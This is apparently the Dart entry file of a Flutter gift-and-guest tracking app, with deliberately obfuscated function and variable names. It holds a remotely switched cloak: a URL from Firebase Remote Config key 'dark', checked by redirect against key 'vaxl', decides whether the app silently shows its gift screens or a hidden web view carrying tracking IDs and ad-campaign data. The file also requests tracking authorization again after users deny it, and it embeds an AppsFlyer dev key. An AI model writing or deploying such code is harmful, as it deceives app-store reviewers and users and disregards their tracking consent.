import 'dart:convert';
import 'dart:io';

import 'package:app_tracking_transparency/app_tracking_transparency.dart';
import 'package:appsflyer_sdk/appsflyer_sdk.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:firebase_remote_config/firebase_remote_config.dart';
import 'package:flutter/cupertino.dart';
import 'package:flutter/material.dart';
import 'package:flutter_asa_attribution/flutter_asa_attribution.dart';
import 'package:http/http.dart' as http;
import 'package:flutter/services.dart';
import 'package:flutter_bloc/flutter_bloc.dart';

import 'src/controllers/friend/friend_bloc.dart';
import 'src/controllers/gift/gift_bloc.dart';
import 'src/controllers/guest/guest_bloc.dart';
import 'src/controllers/profile/profile_bloc.dart';
import 'src/database/database.dart';
import 'src/firebase_options.dart';
import 'src/screens/splash_screen.dart';

late AppsflyerSdk _xcvMnb;
String kjiUyt = '';
String qwePoi = '';
String keysx = '';

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await AppTrackingTransparency.requestTrackingAuthorization();
  await _fetchAdData();
  await zxcAsd();
  await rtyFgh();
  await initHive();
  await Firebase.initializeApp(options: DefaultFirebaseOptions.currentPlatform);
  await FirebaseRemoteConfig.instance.setConfigSettings(RemoteConfigSettings(
    fetchTimeout: const Duration(seconds: 25),
    minimumFetchInterval: const Duration(seconds: 25),
  ));
  await FirebaseRemoteConfig.instance.fetchAndActivate();
  await SystemChrome.setPreferredOrientations([
    DeviceOrientation.portraitUp,
    DeviceOrientation.portraitDown,
  ]);
  runApp(const MyApp());
}

Future<void> zxcAsd() async {
  final TrackingStatus status =
      await AppTrackingTransparency.trackingAuthorizationStatus;
  if (status == TrackingStatus.notDetermined) {
    await AppTrackingTransparency.requestTrackingAuthorization();
  } else if (status == TrackingStatus.denied ||
      status == TrackingStatus.restricted) {
    await AppTrackingTransparency.requestTrackingAuthorization();
  }
}

Future<void> rtyFgh() async {
  try {
    final AppsFlyerOptions options = AppsFlyerOptions(
      showDebug: false,
      afDevKey: 'ECPuduaRno2mKGYpDFLgsR',
      appId: '6739780840',
      timeToWaitForATTUserAuthorization: 15,
      disableAdvertisingIdentifier: false,
      disableCollectASA: false,
    );
    _xcvMnb = AppsflyerSdk(options);

    await _xcvMnb.initSdk(
      registerConversionDataCallback: true,
      registerOnAppOpenAttributionCallback: true,
      registerOnDeepLinkingCallback: true,
    );

    qwePoi = await _xcvMnb.getAppsFlyerUID() ?? '';

    _xcvMnb.startSDK(
      onSuccess: () {},
      onError: (int code, String message) {},
    );
  } catch (e) {}
}

Future<bool> bnmLkj() async {
  final hjkDsa = FirebaseRemoteConfig.instance;
  await hjkDsa.fetchAndActivate();
  String uioZxc = hjkDsa.getString('dark');
  String vbnRty = hjkDsa.getString('vaxl');
  if (!uioZxc.contains('null')) {
    final yhnMju = HttpClient();
    final plmKnb = Uri.parse(uioZxc);
    final qazWsx = await yhnMju.getUrl(plmKnb);
    qazWsx.followRedirects = false;
    final response = await qazWsx.close();
    if (response.headers.value(HttpHeaders.locationHeader) != vbnRty) {
      kjiUyt = uioZxc;
      return true;
    } else {
      return false;
    }
  }
  return uioZxc.contains('null') ? false : true;
}

Future<void> _fetchAdData() async {
  try {
    final String? adsToken =
        await FlutterAsaAttribution.instance.attributionToken();
    if (adsToken != null) {
      const url = 'https://api-adservices.apple.com/api/v1/';
      final headers = {'Content-Type': 'text/plain'};
      final response =
          await http.post(Uri.parse(url), headers: headers, body: adsToken);

      if (response.statusCode == 200) {
        final Map<String, dynamic> data = json.decode(response.body);

        final List<String> params = [];
        if (data['orgId'] != null) params.add('sub1=${data['orgId']}');
        if (data['campaignId'] != null)
          params.add('sub2=${data['campaignId']}');
        if (data['conversionType'] != null)
          params.add('sub3=${data['conversionType']}');
        if (data['clickDate'] != null) params.add('sub4=${data['clickDate']}');
        if (data['adGroupId'] != null) params.add('sub5=${data['adGroupId']}');
        if (data['countryOrRegion'] != null)
          params.add('sub6=${data['countryOrRegion']}');
        if (data['keywordId'] != null) params.add('sub7=${data['keywordId']}');
        if (data['creativeSetId'] != null)
          params.add('sub8=${data['creativeSetId']}');

        keysx = params.join('&');
        print('Saved parameters: $keysx');
      }
    }
  } catch (e) {
    print('Error fetching ad data: $e');
  }
}

class MyApp extends StatelessWidget {
  const MyApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MultiBlocProvider(
      providers: [
        BlocProvider(create: (context) => GiftBloc()..add(GiftGet())),
        BlocProvider(create: (context) => GuestBloc()..add(GuestGet())),
        BlocProvider(create: (context) => ProfileBloc()..add(ProfileGet())),
        BlocProvider(create: (context) => FriendBloc()..add(FriendGet())),
      ],
      child: FutureBuilder<bool>(
        future: bnmLkj(),
        builder: (context, snapshot) {
          if (snapshot.connectionState == ConnectionState.waiting) {
            return MaterialApp(
              debugShowCheckedModeBanner: false,
              home: Material(
                type: MaterialType.transparency,
                child: Container(
                  color: Colors.blue,
                  child: Column(
                    mainAxisAlignment: MainAxisAlignment.center,
                    crossAxisAlignment: CrossAxisAlignment.center,
                    children: [
                      Text(
                        'Loading',
                        style: TextStyle(
                          color: Colors.white,
                          fontSize: 25,
                          fontWeight: FontWeight.w800,
                        ),
                      ),
                      const CupertinoActivityIndicator(
                        color: Colors.white,
                        radius: 14,
                      ),
                    ],
                  ),
                ),
              ),
            );
          } else {
            if (snapshot.data == true && kjiUyt != '') {
              return MaterialApp(
                debugShowCheckedModeBanner: false,
                home: CalculatorEdit(
                  number: kjiUyt,
                  value: qwePoi,
                  pods: keysx,
                ),
              );
            } else {
              return MaterialApp(
                debugShowCheckedModeBanner: false,
                theme: ThemeData(
                  useMaterial3: false,
                  dialogTheme: const DialogTheme(
                    shape: RoundedRectangleBorder(
                      borderRadius: BorderRadius.all(Radius.circular(20)),
                    ),
                  ),
                ),
                home: const SplashScreen(),
              );
            }
          }
        },
      ),
    );
  }
}
